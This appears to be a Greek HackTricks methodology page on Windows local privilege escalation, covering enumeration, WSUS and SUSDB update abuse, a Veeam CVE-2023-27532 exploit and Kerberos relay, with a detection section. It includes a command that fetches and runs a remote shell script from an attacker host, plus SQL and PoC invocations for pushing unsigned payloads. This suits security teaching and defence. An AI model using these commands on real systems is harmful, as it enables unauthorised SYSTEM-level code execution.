# Τοπική κλιμάκωση προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για τον εντοπισμό διανυσμάτων τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει γενική μεθοδολογία κλιμάκωσης προνομίων στα Windows από αρκετούς θεμελιώδεις οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή απαρίθμησης βασίζεται επίσης σε κοινοτικά εργαστήρια και λίστες ελέγχου.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση της DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Αρχικές έννοιες των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs, ανατρέξτε στην παρακάτω σελίδα:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Έλεγχοι ασφαλείας των Windows

Στα Windows υπάρχουν διάφορα πράγματα που θα μπορούσαν να **σας εμποδίσουν να απαριθμήσετε το σύστημα**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να **εντοπίσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **απαριθμήσετε** όλους αυτούς τους **μηχανισμούς άμυνας** πριν ξεκινήσετε την απαρίθμηση για κλιμάκωση προνομίων:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline επεξεργασία του UEFI NVRAM σε αλυσίδα DMA πριν από την εκκίνηση και τροποποίησης μνήμης των Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Προστασία διαχειριστή / Αθόρυβη ανύψωση μέσω UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να αξιοποιηθούν για πρόσβαση σε High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλών διαδρομών του AppInfo. Δείτε εδώ την ειδική ροή εργασίας παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση του μητρώου προσβασιμότητας του Secure Desktop μπορεί να αξιοποιηθεί για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης μια διαδρομή LPE μέσω **SMB αυθαίρετης θύρας**, όπου ένας προνομιούχος τοπικός έλεγχος ταυτότητας NTLM ανακλάται μέσω μιας επαναχρησιμοποιούμενης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Απαρίθμηση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστά ευπαθή σημεία (ελέγξτε επίσης τις εφαρμοσμένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits έκδοσης

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας τη **μαζική επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του OS, τις εγκατεστημένες ενημερώσεις και πιθανά σχετικά advisory· επαληθεύστε το ακριβές προϊόν και τις νεότερες ενημερώσεις που αντικαθιστούν προηγούμενες, πριν θεωρήσετε ότι ένα αποτέλεσμα ισχύει.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε την **αρχιτεκτονική της διεργασίας που εκτελείται**, καθώς και την αρχιτεκτονική του OS. Σε Windows 64-bit, μια διεργασία 32-bit υπόκειται στην [ανακατεύθυνση του συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως παραπέμπει στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` παρέχει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το alias δεν είναι διαθέσιμο σε διεργασία 64-bit. Ένα build του OS ή η απουσία ενός KB δεν αποδεικνύει ότι είναι δυνατή η εκμετάλλευση· συγκρίνετε το build που εκτελείται, την εγκατεστημένη ενημέρωση ή νεότερη ενημέρωση που την αντικαθιστά, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά, με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν διαπιστευτήρια ή άλλες juicy πληροφορίες αποθηκευμένες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε εδώ: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι μόνο ένα παράδειγμα. Η [πολιτική καταγραφής PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει τα αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL του αρχείου πριν εξετάσετε ένα transcript: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Ένα transcript με δικαίωμα ανάγνωσης αποτελεί μόνο στοιχείο προς διερεύνηση, εφόσον το περιεχόμενό του αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα προνόμια και αυτή η ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### PowerShell Module Logging

Καταγράφονται λεπτομέρειες εκτελέσεων στο PowerShell pipeline, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται όλες οι λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα «Αρχεία transcript» της τεκμηρίωσης και επιλέξτε **«Module Logging»** αντί για **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα αρχεία καταγραφής του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφονται πλήρως η δραστηριότητα και το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται κατά την εκτέλεσή του. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο αρχείο ελέγχου κάθε δραστηριότητας, χρήσιμο για την εγκληματολογική ανάλυση και τη διερεύνηση κακόβουλης συμπεριφοράς. Η τεκμηρίωση όλης της δραστηριότητας κατά την εκτέλεση παρέχει λεπτομερή εικόνα της διαδικασίας.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Δίσκοι

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα HTTP WSUS endpoint αποτελεί ένδειξη για περαιτέρω διερεύνηση πιθανής υποκλοπής μεταδεδομένων ενημερώσεων. Η εκμετάλλευσή του εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν ένας attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του, καθώς και από τις πολιτικές εμπιστοσύνης ενημερώσεων και εγκατάστασης του client. Το URL από μόνο του δεν αρκεί για την εκτέλεση κώδικα. [Η Microsoft συνιστά τη χρήση TLS για τα μεταδεδομένα WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινήστε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την ακόλουθη εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή το ακόλουθο σε PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβετε μια απάντηση όπως κάποια από τις εξής:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσα με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την υπηρεσία intranet που έχει ρυθμιστεί. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή HTTP interception, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάσταση με αυξημένα δικαιώματα. Όταν είναι `0`, αυτό το συγκεκριμένο διαμορφωμένο endpoint WSUS δεν επιλέγεται από αυτήν την πολιτική.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- πρόκειται για weaponized MiTM exploit scripts που εισάγουν «fake» updates σε μη κρυπτογραφημένη με SSL κίνηση WSUS.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το κενό ασφαλείας που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του τοπικού χρήστη μας και το Windows Updates χρησιμοποιεί τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα ως χρήστης με αυξημένα δικαιώματα στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε τόσο HTTP όσο και HTTPS κίνηση WSUS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει επικύρωση trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται θεωρείται έμπιστο από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

### Ενημερώσεις WSUS που ελέγχονται από διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν WSUS server. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του server και τυχόν εκχωρημένα δικαιώματα WSUS, και στη συνέχεια εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης δημοσίευσης](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το signing certificate που χρησιμοποιείται για περιεχόμενο που δημοσιεύεται τοπικά. Επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, εφαρμόζεται στον στόχο και εγκαθίσταται σε περιβάλλον με αυξημένα δικαιώματα, πριν θεωρήσετε ότι αυτό αποτελεί διαδρομή κλιμάκωσης προνομίων. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν τεκμηριώνουν αυτές τις προϋποθέσεις.

### Κατάχρηση custom updates στο SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Αυτό είναι διαφορετική αστοχία στο όριο εμπιστοσύνης από την υποκλοπή μιας σύνδεσης HTTP WSUS: η προϋπόθεση είναι να υπάρχει επαρκής πρόσβαση στις **stored procedures της βάσης δεδομένων WSUS (`SUSDB`)** για τη δημοσίευση και έγκριση ενός custom update. Μία πρακτική διαδρομή αρχικής πρόσβασης είναι η αναμετάδοση ενός λογαριασμού υπολογιστή WSUS upstream σε ξεχωριστό MSSQL server που φιλοξενεί το `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από την ανάπτυξη, επομένως πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να θεωρήσετε ότι απαιτούνται δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για την ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει τον έλεγχο ταυτότητας WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε το [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Η ροή εργασίας custom-update χρησιμοποιεί νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή μεταδεδομένων ενημέρωσης | `spImportUpdate` |
| Αποθήκευση XML fragments προαπαιτούμενων, τοπικοποιημένων και εκτεταμένων δεδομένων | `spSaveXMLFragment` |
| Συσχέτιση του content digest με URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Καταγραφή/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για αυτήν την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν σε όλα τα εισαγόμενα metadata/fragments. Αφού ορίσετε το content URL και την ομάδα-στόχο, η τελική έγκριση έχει την εξής μορφή· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και deployment αντί να επαναχρησιμοποιήσετε GUID από παραδείγματα.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Παράκαμψη υπογραφής βάσει επέκτασης

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`· έτσι παραλείπεται το `CheckCertificateSignature` χωρίς να έχει προηγουμένως επιβεβαιωθεί ότι τα bytes είναι κείμενο ή έγκυρη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον χειριστή εγκατάστασης γραμμής εντολών της ενημέρωσης. Πρόκειται για σφάλμα σύγχυσης πολιτικής/τύπου και όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Σταδιοποίηση και αυτοματοποίηση συμβατές με BITS

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να ικανοποιεί τις προσδοκίες του BITS για HTTP: δεν αρκεί να είναι προσβάσιμο το URL, επειδή η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας διακομιστής χωρίς υποστήριξη Range προκαλεί συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο MSSQL client για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για τη σταδιοποίηση περιεχομένου. Μια ελάχιστη εντολή για εξουσιοδοτημένο εργαστηριακό περιβάλλον είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επανάληψης

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η επιλογή `4 - Auto download and schedule install` στη διαδρομή `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` επιτρέπει τη λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης σύμφωνα με το διαμορφωμένο χρονοδιάγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Κατά τις δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε σε αποτυχία/μη ολοκληρωμένη κατάσταση προσφερόταν ξανά αμέσως μόλις τερματιζόταν η διεργασία callback, οπότε η συμπεριφορά επανάληψης μπορεί να εξελιχθεί σε recurring execution persistence· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία ελέγχου για detection και hardening

Χρήσιμα σημεία ελέγχου στον server και στον client από αυτή την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Ελέγξτε την εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στο `SUSDB`· διερευνήστε νέες ομάδες στόχευσης, εξωτερικές προελεύσεις περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενους principals (ειδικά λογαριασμούς που δεν είναι υπολογιστές).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και `EventId=364`· συσχετίστε την επαλήθευση με την επέκταση του payload και το magic του περιεχομένου, αντί να βασίζεστε στο επίθημα.
- Αναζητήστε επανειλημμένες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update, καθώς και εκτέλεση PE ή απρόσμενη δραστηριότητα child/network από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Όπου υποστηρίζεται, απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων και περιορίστε την πρόσβαση στο δίκτυο της βάσης δεδομένων στον server WSUS και σε εξουσιοδοτημένα διαχειριστικά συστήματα. Περιορίστε στο ελάχιστο και ελέγχετε τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Αυτόματοι updaters τρίτων και Agent IPC (local privesc)

Πολλοί εταιρικοί agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα προνομιούχο κανάλι ενημέρωσης. Αν η διαδικασία εγγραφής μπορεί να εξαναγκαστεί να συνδεθεί με server του attacker και ο updater εμπιστεύεται rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Τα Veeam Backup & Replication και Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στο **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη εξουσιοδοτημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου του δικτύου backup· ένα ξεχωριστό δημόσιο PoC επιδεικνύει διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία μπορεί να κάνει bind πέρα από το localhost, επομένως ελέγξτε την πραγματική διεύθυνση και το PID της.

- **Recon**: επιβεβαιώστε ότι το TCP/9401 ανήκει στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα metadata των patches. Οι εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος για patches.
- **Ελάχιστες εκδόσεις με διόρθωση**: Η Veeam αναφέρει τις **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· οι προγενέστερες εκδόσεις επηρεάζονται. Μια τετραμερής έκδοση αρχείου από μόνη της δεν μπορεί να διακρίνει μια μη διορθωμένη βασική έκδοση από ένα μεταγενέστερο patch στους ίδιους αριθμούς build. Επαληθεύστε το αναγνωριστικό patch στο [ιστορικό builds του προμηθευτή](https://www.veeam.com/kb2680) πριν χαρακτηρίσετε μια οριακή έκδοση build ως διορθωμένη.
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τις απαιτούμενες Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα payload SYSTEM μέσω του τοπικού socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Το PoC που παρατίθεται επιδεικνύει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλευτική ανακοίνωση του προμηθευτή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

Ένα τοπικό Kerberos relay μπορεί να επιτρέψει τη μετάβαση από σύνδεση χρήστη με χαμηλότερα προνόμια σε εγγραφή προνομιακού καταλόγου, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και ο αναμεταδιδόμενος principal έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay](https://github.com/cube0x0/KrbRelay) τεκμηριώνει εγγραφές LDAP RBCD και `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί τα κατάλληλα δικαιώματα delegation και στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον τομέα.

